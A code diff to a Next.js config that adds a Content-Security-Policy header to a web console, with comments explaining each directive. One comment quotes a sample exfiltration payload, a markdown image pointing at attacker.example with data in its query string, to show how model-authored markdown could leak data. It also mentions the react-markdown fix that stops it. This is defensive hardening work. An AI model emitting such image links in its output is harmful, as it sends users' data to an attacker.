@@ -120,13 +120,44 @@ const nextConfig = {
     // compatibility cost. A full CSP is deliberately not attempted: Next.js
     // needs 'unsafe-inline' for styles unless nonces are wired through, so a
     // rushed policy would either break the console or be worth nothing.
+    //
+    // The directives beside it are the subset with the same property — each one
+    // forbids something the console does not do, so none of them can break it:
+    //
+    //   img-src 'self' data: blob:  The only <img> in the app is the local
+    //     logo. This is the directive that gives the model-authored markdown
+    //     fix (react-markdown `img: () => null`) a second floor: if any future
+    //     surface renders model prose without that components map, a
+    //     `![](https://attacker.example/p.png?d=…)` still fetches nothing.
+    //     data: and blob: stay for in-page downloads and canvas work.
+    //   object-src 'none'           No <object>/<embed> anywhere.
+    //   base-uri 'self'             No <base>; an injected one would silently
+    //     repoint every relative URL on the page.
+    //   frame-src 'self'            NOT 'none': /api-docs frames the API's own
+    //     ReDoc and Swagger UI at /api/redoc and /api/docs. Those are
+    //     same-origin through the BFF, so 'self' keeps that page working while
+    //     still refusing a remote frame.
+    //   form-action 'self'          Every <form> posts to this origin,
+    //     including the dynamically built one the CLI login flow submits.
+    //
+    // NOT added: script-src and style-src. The App Router emits inline
+    // bootstrap scripts, so either would need 'unsafe-inline' without nonce
+    // plumbing — which is the "worth nothing" case above, not a tightening.
+    const csp = [
+      "frame-ancestors 'none'",
+      "img-src 'self' data: blob:",
+      "object-src 'none'",
+      "base-uri 'self'",
+      "frame-src 'self'",
+      "form-action 'self'",
+    ].join('; ')
     headers.push({
       source: '/:path*',
       headers: [
         { key: 'X-Frame-Options', value: 'DENY' },
         { key: 'X-Content-Type-Options', value: 'nosniff' },
         { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
-        { key: 'Content-Security-Policy', value: "frame-ancestors 'none'" },
+        { key: 'Content-Security-Policy', value: csp },
       ],
     })
     if (hstsValue) {
